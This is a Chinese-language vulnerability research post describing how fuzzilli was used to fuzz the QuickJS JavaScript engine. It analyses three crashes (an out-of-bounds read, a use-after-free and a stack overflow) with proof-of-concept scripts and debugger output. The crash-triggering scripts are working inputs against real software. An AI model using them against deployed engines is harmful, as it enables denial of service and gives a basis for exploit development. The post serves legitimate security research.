> 原文链接: https://www.anquanke.com//post/id/218427 


# 使用fuzzilli对Javascript引擎QuickJS进行Fuzzing和漏洞分析


                                阅读量   
                                **221724**
                            
                        |
                        
                                                                                    



[![](https://p4.ssl.qhimg.com/t01bea54e0cfba24365.png)](https://p4.ssl.qhimg.com/t01bea54e0cfba24365.png)



作者：维阵漏洞研究员—lawren**<br>**

## 概述

Javascript 解析引擎不论是在PC端还是移动端都有非常多的应用实例，甚至于最新发布的鸿蒙 OS 2.0 其中都使用了JS解析引擎作为上层和系统底层之间的中间交互过程。

维阵团队对JS 解析引擎中新兴的项目做了对应的漏洞挖掘工作，对几处安全漏洞进行解析。

使用Google开源的Javascript引擎Fuzzer-fuzzilli对QuickJS进行Fuzzing，确定漏洞触发流程和漏洞代码。



## 1. 搭建fuzzilli环境

fuzzilli是Google开源的一款JavaScript的模糊测试工具，由SamuelGroß编写，使用swift语言开发。

项目地址：[https://github.com/googleprojectzero/fuzzilli/](https://github.com/googleprojectzero/fuzzilli/)

### <a class="reference-link" name="1.1%20%E4%B8%8B%E8%BD%BD%E5%AE%89%E8%A3%85swift"></a>1.1 下载安装swift

去官网下载Linux可执行文件，解压缩后可直接运行使用。

官网：[https://swift.org/download/#releases](https://swift.org/download/#releases)<br>
例如：[https://swift.org/builds/swift-5.3-release/ubuntu1804/swift-5.3-RELEASE/swift-5.3-RELEASE-ubuntu18.04.tar.gz](https://swift.org/builds/swift-5.3-release/ubuntu1804/swift-5.3-RELEASE/swift-5.3-RELEASE-ubuntu18.04.tar.gz)

### <a class="reference-link" name="1.2%20%E4%B8%8B%E8%BD%BD%E7%BC%96%E8%AF%91fuzzilli"></a>1.2 下载编译fuzzilli

```
$ git clone https://github.com/googleprojectzero/fuzzilli.git
$ cd fuzzilli
$ swift build -c release -Xlinker='-lrt'
```



## 2. Fuzz QuickJS引擎

QuickJS是一个小型并且可嵌入的Javascript引擎，它支持ES2020规范，包括模块、异步生成器和代理器。

### <a class="reference-link" name="2.1%20%E7%BC%96%E8%AF%91QuickJS"></a>2.1 编译QuickJS

使用fuzzilli进行模糊测试需要对相应的JS引擎源代码进行一定的修改，fuzzilli已经对一些常见的JS引擎发布了patch脚本，QuickJS的patch脚本在录/fuzzilli/Targets/QJS/Patches中：

```
$ cd fuzzilli/Targets/QJS
$ git clone https://github.com/horhof/quickjs.git
$ cd quickjs
$ git checkout c389f9594e83776ffb86410016959a7676728bf9 -b fuzz
$ cp ../Patches/Fuzzilli-instrumentation-for-QJS.patch .
$ patch -p1 &lt; Fuzzilli-instrumentation-for-QJS.patch
$ make
```

### <a class="reference-link" name="2.2%20%E5%BC%80%E5%A7%8BFuzz"></a>2.2 开始Fuzz

```
$ sudo sysctl -w 'kernel.core_pattern=|/bin/false'  # 首次运行
$ swift run -c release -Xlinker='-lrt' FuzzilliCli --profile=qjs --storagePath=Targets/QJS/out Targets/QJS/quickjs/qjs
```



## 3. Crash 分析

通过对QuickJS发布版v2020-07-05(最新版是v2020-09-06)进行Fuzz得到三个Crash。

### <a class="reference-link" name="3.1%20Memory_corruption_JS_CallInternal.lto_priv.135"></a>3.1 Memory_corruption_JS_CallInternal.lto_priv.135

```
Memory_corruption_JS_CallInternal.lto_priv.135.js  

    var v4 = [1337];
    var v5 = `{`length:"65537"`}`;
    var v8 = Function.apply(v4,v5);
    var v10 = new Promise(v8);
```

利用gdb加载调试：

```
$ gdb -q -args ./qjs ../Crash/Memory_corruption_JS_CallInternal.lto_priv.135.js 
Reading symbols from ./qjs...done.
(gdb) r
Starting program: /home/test/JS/QuickJS-20200705/qjs ../Crash/Memory_corruption_JS_CallInternal.lto_priv.135.js
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x00005555555e5a7e in JS_CallInternal (caller_ctx=0x555555646260, func_obj=..., this_obj=..., new_target=..., argc=2, argv=0x7fffffffd370, flags=2) at quickjs.c:16805
warning: Source file is more recent than executable.
16805                    sp[0] = JS_DupValue(ctx, arg_buf[idx]);
(gdb) bt
#0  0x00005555555e5a7e in JS_CallInternal (caller_ctx=0x555555646260, func_obj=..., this_obj=..., new_target=..., argc=2, argv=0x7fffffffd370, flags=2) at quickjs.c:16805
#1  0x00005555555a42b4 in JS_Call (argv=0x7fffffffd370, argc=2, this_obj=..., func_obj=..., ctx=0x555555646c90) at quickjs.c:45944
#2  js_promise_constructor (ctx=0x555555646c90, new_target=..., argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;) at quickjs.c:45944
#3  0x00005555555e08aa in js_call_c_function (ctx=&lt;optimized out&gt;, func_obj=..., this_obj=..., argc=&lt;optimized out&gt;, argv=0x7fffffffd4f0, flags=1) at quickjs.c:15861
#4  0x00005555555e3848 in JS_CallInternal (caller_ctx=0x555555646260, func_obj=..., this_obj=..., new_target=..., argc=2, argv=0x0, flags=2) at quickjs.c:16444
#5  0x00005555555d8ac0 in JS_CallFree (ctx=0x555555646c90, func_obj=..., this_obj=..., argc=&lt;optimized out&gt;, argv=0x0) at quickjs.c:18514
#6  0x00005555555c15bd in JS_EvalFunctionInternal (ctx=ctx@entry=0x555555646c90, fun_obj=..., this_obj=..., var_refs=var_refs@entry=0x0, sf=0x0) at quickjs.c:32945
#7  0x00005555555ccb12 in __JS_EvalInternal (ctx=0x555555646c90, this_obj=..., input=&lt;optimized out&gt;, input_len=&lt;optimized out&gt;, filename=&lt;optimized out&gt;, flags=0, scope_idx=-1) at quickjs.c:33098
#8  0x00005555555c148a in JS_EvalInternal (scope_idx=-1, flags=&lt;optimized out&gt;, filename=&lt;optimized out&gt;, input_len=&lt;optimized out&gt;, input=&lt;optimized out&gt;, this_obj=..., ctx=&lt;optimized out&gt;)
    at quickjs.c:33116
#9  JS_Eval (ctx=&lt;optimized out&gt;, input=&lt;optimized out&gt;, input_len=&lt;optimized out&gt;, filename=&lt;optimized out&gt;, eval_flags=&lt;optimized out&gt;, ctx=&lt;optimized out&gt;, input=&lt;optimized out&gt;, 
    input_len=&lt;optimized out&gt;, filename=&lt;optimized out&gt;, eval_flags=&lt;optimized out&gt;) at quickjs.c:33146
#10 0x0000555555605a3c in eval_buf (ctx=0x555555646c90, buf=&lt;optimized out&gt;, buf_len=&lt;optimized out&gt;, filename=&lt;optimized out&gt;, eval_flags=&lt;optimized out&gt;) at qjs.c:67
#11 0x0000555555605b4e in eval_file (ctx=&lt;optimized out&gt;, filename=&lt;optimized out&gt;, module=&lt;optimized out&gt;, filename=&lt;optimized out&gt;, ctx=&lt;optimized out&gt;, module=&lt;optimized out&gt;) at qjs.c:99
#12 0x0000555555566525 in main (argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;) at qjs.c:503
(gdb) x/3i $rip
=&gt; 0x5555555e5a7e &lt;JS_CallInternal+19454&gt;:    mov    (%rax),%rdx
0x5555555e5a81 &lt;JS_CallInternal+19457&gt;:    mov    0x8(%rax),%rax
0x5555555e5a85 &lt;JS_CallInternal+19461&gt;:    cmp    $0xfffffff4,%eax
(gdb) p/x $rax
$1 = 0x8000000fd360
(gdb) x/gx $rax
0x8000000fd360:    Cannot access memory at address 0x8000000fd360
```

对应的源代码为：

```
CASE(OP_get_arg):
`{`
    int idx;
    idx = get_u16(pc);
    pc += 2;
    sp[0] = JS_DupValue(ctx, arg_buf[idx]);
    sp++;
`}`
BREAK;
```

经过调试可以看到idx等于0xffff：

```
(gdb) x/5i $rip
=&gt; 0x5555555e5a6e &lt;JS_CallInternal+19438&gt;:    movzwl (%r12),%eax
0x5555555e5a73 &lt;JS_CallInternal+19443&gt;:    shl    $0x4,%rax
0x5555555e5a77 &lt;JS_CallInternal+19447&gt;:    add    -0x148(%rbp),%rax
0x5555555e5a7e &lt;JS_CallInternal+19454&gt;:    mov    (%rax),%rdx
0x5555555e5a81 &lt;JS_CallInternal+19457&gt;:    mov    0x8(%rax),%rax
(gdb) x/gx $r12 - 1
0x7ffff77bf090:    0x0000000029ffff5b
(gdb) p 0x5b
$1 = 91
(gdb) ni
(gdb) x/i $rip
=&gt; 0x5555555e5a73 &lt;JS_CallInternal+19443&gt;:    shl    $0x4,%rax
(gdb) p/x $rax
$2 = 0xffff
```

idx大小超过arg_buf的长度，之后会发生越界读取，造成程序崩溃。

[![](https://p3.ssl.qhimg.com/t0163109a1a22708568.gif)](https://p3.ssl.qhimg.com/t0163109a1a22708568.gif)

### <a class="reference-link" name="3.2%20Heap-use-after-free_gc_decref_child"></a>3.2 Heap-use-after-free_gc_decref_child

```
Heap-use-after-free_gc_decref_child.js

    var v13 = RegExp();
    var v15 = Symbol.search;
    var v19 = [1337,1337];
    function v27(v28,v29,v30) `{`
        var v32 = `{`...v19,...v30`}`;
        var v44 = new Proxy(Promise,this);
        var v45 = v32.__proto__;
        v45.__proto__ = v44;
        return v44;
    `}`
    function v46(v47) `{`
        return v47;
    `}`
    var v54 = `{`get:v46`}`;
    var v56 = new Proxy(v27,v54);
    function v57(v58,v59) `{`
        var v61 = new Uint16Array(v56);
    `}`
    var v63 = new Promise(v57);
    var v64 = v13[v15];
    var v68 = v19.some(v64,v19);
```

直接加载运行触发UAF：

```
$ ./qjs ../Crash/Heap-use-after-free_gc_decref_child.js 
=================================================================
==76200==ERROR: AddressSanitizer: heap-use-after-free on address 0x607000007640 at pc 0x563e23b9c6e4 bp 0x7ffc435b56b0 sp 0x7ffc435b56a0
READ of size 4 at 0x607000007640 thread T0
    #0 0x563e23b9c6e3 in js_regexp_Symbol_search.lto_priv.363 (/home/test/JS/QuickJS-20200705/qjs+0xf76e3)

0x607000007640 is located 0 bytes inside of 72-byte region [0x607000007640,0x607000007688)
freed by thread T0 here:
    #0 0x7f3b80489f10 in free (/usr/lib/x86_64-linux-gnu/libasan.so.5+0xedf10)
    #1 0x563e23c7cf61 in __JS_FreeValueRT (/home/test/JS/QuickJS-20200705/qjs+0x1d7f61)
    #2 0x563e23c8d8f1 in JS_SetPropertyInternal (/home/test/JS/QuickJS-20200705/qjs+0x1e88f1)
    #3 0x563e23b9c02a in js_regexp_Symbol_search.lto_priv.363 (/home/test/JS/QuickJS-20200705/qjs+0xf702a)

previously allocated by thread T0 here:
    #0 0x7f3b8048a2d0 in __interceptor_malloc (/usr/lib/x86_64-linux-gnu/libasan.so.5+0xee2d0)
    #1 0x563e23c95f34 in js_def_malloc (/home/test/JS/QuickJS-20200705/qjs+0x1f0f34)
    #2 0x563e23ca2c27 in js_malloc (/home/test/JS/QuickJS-20200705/qjs+0x1fdc27)
    #3 0x563e23ca2cea in JS_NewObjectFromShape.lto_priv.146 (/home/test/JS/QuickJS-20200705/qjs+0x1fdcea)
    #4 0x563e23ca37a3 in JS_NewObjectProtoClass (/home/test/JS/QuickJS-20200705/qjs+0x1fe7a3) Breakpoint 2, JS_NewObjectProtoClass (ctx=0x615000000080, proto_val=..., class_id=48) at quickjs.c:4783
    #5 0x563e23b84cea in js_proxy_constructor (/home/test/JS/QuickJS-20200705/qjs+0xdfcea)
    #6 0x563e23c542d0 in js_call_c_function.lto_priv.540 (/home/test/JS/QuickJS-20200705/qjs+0x1af2d0)
    #7 0x563e23c2d171 in JS_CallConstructorInternal.lto_priv.156 (/home/test/JS/QuickJS-20200705/qjs+0x188171)
    #8 0x563e23c32115 in JS_CallInternal.lto_priv.93 (/home/test/JS/QuickJS-20200705/qjs+0x18d115)
    #9 0x563e23c1713c in JS_CallFree.lto_priv.341 (/home/test/JS/QuickJS-20200705/qjs+0x17213c)
    #10 0x563e23b7b5df in js_proxy_get (/home/test/JS/QuickJS-20200705/qjs+0xd65df)
    #11 0x563e23c8647a in JS_GetPropertyInternal (/home/test/JS/QuickJS-20200705/qjs+0x1e147a)
    #12 0x563e23b9bec6 in js_regexp_Symbol_search.lto_priv.363 (/home/test/JS/QuickJS-20200705/qjs+0xf6ec6)
```

漏洞发生在js_regexp_Symbol_search函数中：

```
SUMMARY: AddressSanitizer: heap-use-after-free (/home/test/JS/QuickJS-20200705/qjs+0xf76e3) in js_regexp_Symbol_search.lto_priv.363
Shadow bytes around the buggy address:
0x0c0e7fff8e70: fa fa fa fa fd fd fd fd fd fd fd fd fd fa fa fa
0x0c0e7fff8e80: fa fa fd fd fd fd fd fd fd fd fd fa fa fa fa fa
0x0c0e7fff8e90: 00 00 00 00 00 00 00 00 00 fa fa fa fa fa 00 00
0x0c0e7fff8ea0: 00 00 00 00 00 00 00 fa fa fa fa fa 00 00 00 00
0x0c0e7fff8eb0: 00 00 00 00 00 fa fa fa fa fa fd fd fd fd fd fd
=&gt;0x0c0e7fff8ec0: fd fd fd fa fa fa fa fa[fd]fd fd fd fd fd fd fd
0x0c0e7fff8ed0: fd fa fa fa fa fa fd fd fd fd fd fd fd fd fd fa
0x0c0e7fff8ee0: fa fa fa fa fd fd fd fd fd fd fd fd fd fa fa fa
0x0c0e7fff8ef0: fa fa fd fd fd fd fd fd fd fd fd fa fa fa fa fa
0x0c0e7fff8f00: fd fd fd fd fd fd fd fd fd fa fa fa fa fa fd fd
0x0c0e7fff8f10: fd fd fd fd fd fd fd fa fa fa fa fa fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
Addressable:           00
Partially addressable: 01 02 03 04 05 06 07 
Heap left redzone:       fa
Freed heap region:       fd
Stack left redzone:      f1
Stack mid redzone:       f2
Stack right redzone:     f3
Stack after return:      f5
Stack use after scope:   f8
Global redzone:          f9
Global init order:       f6
Poisoned by user:        f7
Container overflow:      fc
Array cookie:            ac
Intra object redzone:    bb
ASan internal:           fe
Left alloca redzone:     ca
Right alloca redzone:    cb
==76200==ABORTING
```

对象在JS_NewObjectFromShape函数中被分配：

```
static JSValue JS_NewObjectFromShape(JSContext *ctx, JSShape *sh, JSClassID class_id)
`{`
    JSObject *p;

    js_trigger_gc(ctx-&gt;rt, sizeof(JSObject));
    p = js_malloc(ctx, sizeof(JSObject));  &lt;-------------------------------------------allocated
    if (unlikely(!p))
        goto fail;

在JS_SetPropertyInternal函数中被释放之后没有清空，

    pr = add_property(ctx, p, prop, JS_PROP_C_W_E);
    if (unlikely(!pr)) `{`
        JS_FreeValue(ctx, val);  &lt;-------------------------------------------freed
        return -1;
    `}`

在js_regexp_Symbol_search函数之后的流程中被读取，造成UAF

        exception:
        JS_FreeValue(ctx, result); &lt;-------------------------------------------UAF
        JS_FreeValue(ctx, str);
        JS_FreeValue(ctx, currentLastIndex);
        JS_FreeValue(ctx, previousLastIndex);
        return JS_EXCEPTION;
    `}`
```

[![](https://p0.ssl.qhimg.com/t0103178655e024dc23.gif)](https://p0.ssl.qhimg.com/t0103178655e024dc23.gif)

### <a class="reference-link" name="3.3%20Stack-overflow_JS_CreateProperty"></a>3.3 Stack-overflow_JS_CreateProperty

```
Stack-overflow_JS_CreateProperty.js

    var v2 = [13.37];
    v2[1] = v2;
    var v3 = v2.flat(100000);
```

可以看到定义了一个v2数组，之后将v2赋值给v2[1],最后调用flat,flat()方法会按照一个可指定的深度递归遍历数组，并将所有元素与遍历到的子数组中的元素合并为一个新数组返回。

利用gdb加载调试：

```
$ gdb -q -args ./qjs ../Crash/Stack-overflow_JS_CreateProperty.js
Reading symbols from ./qjs...done.
(gdb) r
Starting program: /home/test/JS/QuickJS-20200705/qjs ../Crash/Stack-overflow_JS_CreateProperty.js
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x00005555555fca36 in add_fast_array_element (ctx=ctx@entry=0x555555646c90, p=p@entry=0x55555565eca0, val=..., flags=flags@entry=26375) at quickjs.c:8187
8187    `{`
(gdb) bt
#0  0x00005555555fca36 in add_fast_array_element (ctx=ctx@entry=0x555555646c90, p=p@entry=0x55555565eca0, val=..., flags=flags@entry=26375) at quickjs.c:8187
#1  0x00005555555fcf3a in JS_CreateProperty (ctx=ctx@entry=0x555555646c90, p=p@entry=0x55555565eca0, prop=prop@entry=2147508587, val=..., getter=..., setter=..., flags=flags@entry=26375) at quickjs.h:663
#2  0x00005555555fe6a7 in JS_DefineProperty (ctx=0x555555646c90, this_obj=..., prop=2147508587, val=..., getter=..., setter=..., flags=26375) at quickjs.c:9190
#3  0x00005555555ff186 in JS_DefinePropertyValue (ctx=ctx@entry=0x555555646c90, this_obj=..., prop=prop@entry=2147508587, val=..., flags=16391) at quickjs.c:9228
#4  0x00005555555ff301 in JS_DefinePropertyValueValue (ctx=0x555555646c90, this_obj=..., prop=..., val=..., flags=flags@entry=16391) at quickjs.c:9245
#5  0x00005555555ff48a in JS_DefinePropertyValueInt64 (ctx=&lt;optimized out&gt;, this_obj=..., idx=&lt;optimized out&gt;, val=..., flags=16391) at quickjs.h:522
#6  0x00005555555b6dbd in JS_FlattenIntoArray (ctx=ctx@entry=0x555555646c90, target=..., source=..., sourceLen=2, targetIndex=24939, depth=75061, mapperFunction=..., thisArg=...) at quickjs.c:38595
#7  0x00005555555b6d20 in JS_FlattenIntoArray (ctx=ctx@entry=0x555555646c90, target=..., source=..., sourceLen=2, targetIndex=24939, depth=75062, mapperFunction=..., thisArg=...) at quickjs.c:38581
#8  0x00005555555b6d20 in JS_FlattenIntoArray (ctx=ctx@entry=0x555555646c90, target=..., source=..., sourceLen=2, targetIndex=24938, depth=75063, mapperFunction=..., thisArg=...) at quickjs.c:38581
#9  0x00005555555b6d20 in JS_FlattenIntoArray (ctx=ctx@entry=0x555555646c90, target=..., source=..., sourceLen=2, targetIndex=24937, depth=75064, mapperFunction=..., thisArg=...) at quickjs.c:38581
#10 0x00005555555b6d20 in JS_FlattenIntoArray (ctx=ctx@entry=0x555555646c90, target=..., source=..., sourceLen=2, targetIndex=24936, depth=75065, mapperFunction=..., thisArg=...) at quickjs.c:38581
#11 0x00005555555b6d20 in JS_FlattenIntoArray (ctx=ctx@entry=0x555555646c90, target=..., source=..., sourceLen=2, targetIndex=24935, depth=75066, mapperFunction=..., thisArg=...) at quickjs.c:38581
#12 0x00005555555b6d20 in JS_FlattenIntoArray (ctx=ctx@entry=0x555555646c90, target=..., source=..., sourceLen=2, targetIndex=24934, depth=75067, mapperFunction=..., thisArg=...) at quickjs.c:38581
#13 0x00005555555b6d20 in JS_FlattenIntoArray (ctx=ctx@entry=0x555555646c90, target=..., source=..., sourceLen=2, targetIndex=24933, depth=75068, mapperFunction=..., thisArg=...) at quickjs.c:38581
#14 0x00005555555b6d20 in JS_FlattenIntoArray (ctx=ctx@entry=0x555555646c90, target=..., source=..., sourceLen=2, targetIndex=24932, depth=75069, mapperFunction=..., thisArg=...) at quickjs.c:38581
#15 0x00005555555b6d20 in JS_FlattenIntoArray (ctx=ctx@entry=0x555555646c90, target=..., source=..., sourceLen=2, targetIndex=24931, depth=75070, mapperFunction=..., thisArg=...) at quickjs.c:38581
#16 0x00005555555b6d20 in JS_FlattenIntoArray (ctx=ctx@entry=0x555555646c90, target=..., source=..., sourceLen=2, targetIndex=24930, depth=75071, mapperFunction=..., thisArg=...) at quickjs.c:38581
#17 0x00005555555b6d20 in JS_FlattenIntoArray (ctx=ctx@entry=0x555555646c90, target=..., source=..., sourceLen=2, targetIndex=24929, depth=75072, mapperFunction=..., thisArg=...) at quickjs.c:38581
#18 0x00005555555b6d20 in JS_FlattenIntoArray (ctx=ctx@entry=0x555555646c90, target=..., source=..., sourceLen=2, targetIndex=24928, depth=75073, mapperFunction=..., thisArg=...) at quickjs.c:38581
#19 0x00005555555b6d20 in JS_FlattenIntoArray (ctx=ctx@entry=0x555555646c90, target=..., source=..., sourceLen=2, targetIndex=24927, depth=75074, mapperFunction=..., thisArg=...) at quickjs.c:38581
#20 0x00005555555b6d20 in JS_FlattenIntoArray (ctx=ctx@entry=0x555555646c90, target=..., source=..., sourceLen=2, targetIndex=24926, depth=75075, mapperFunction=..., thisArg=...) at quickjs.c:38581
--Type &lt;RET&gt; for more, q to quit, c to continue without paging--q
Quit
(gdb) x/5i $rip
=&gt; 0x5555555fca36 &lt;add_fast_array_element+38&gt;:    mov    %rax,0x28(%rsp)
0x5555555fca3b &lt;add_fast_array_element+43&gt;:    xor    %eax,%eax
0x5555555fca3d &lt;add_fast_array_element+45&gt;:    mov    0x20(%rsi),%rax
0x5555555fca41 &lt;add_fast_array_element+49&gt;:    lea    0x1(%rbx),%r12d
0x5555555fca45 &lt;add_fast_array_element+53&gt;:    mov    0x8(%rax),%edx
(gdb) x/gx $rsp
0x7fffff7fefd0:    Cannot access memory at address 0x7fffff7fefd0
```

程序运行后进行了大量的函数调用，最终导致栈空间不足，触发栈溢出。

v2[1]是v2本身，这就导致一个自循环，flat函数深度在v2上可以是无限，所以会不断调用JS_FlattenIntoArray函数获取下一深度的值，最终导致栈空间不足。

[![](https://p0.ssl.qhimg.com/t0117049aaea8e63469.gif)](https://p0.ssl.qhimg.com/t0117049aaea8e63469.gif)
